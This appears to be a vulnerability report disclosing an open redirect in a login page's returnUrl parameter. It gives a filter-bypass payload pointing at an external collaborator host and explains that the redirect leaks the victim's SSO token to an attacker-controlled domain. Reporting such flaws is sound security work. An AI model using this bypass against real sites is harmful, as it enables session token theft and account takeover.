- Bug : Open Redirect

- Endpoint : /login

- Parameter : returnUrl=

- Payload : ```//%2F/ibxo9v0zc3bi70smse1hv8zn3e95xvlk.oastify.com```

- Description : Discovered an Open redirect during login.

The web application takes in a parameter "returnUrl" where the application redirects the user to the homepage for a normal login flow

You can bypass the filter by using //%2F/ before the url you want the user to redirect to

**Extra Information**

The redirect also leaks the sso token to the redirected url.

The attacker can get the victim's sso token by redirecting the victim to attacker controlled domain
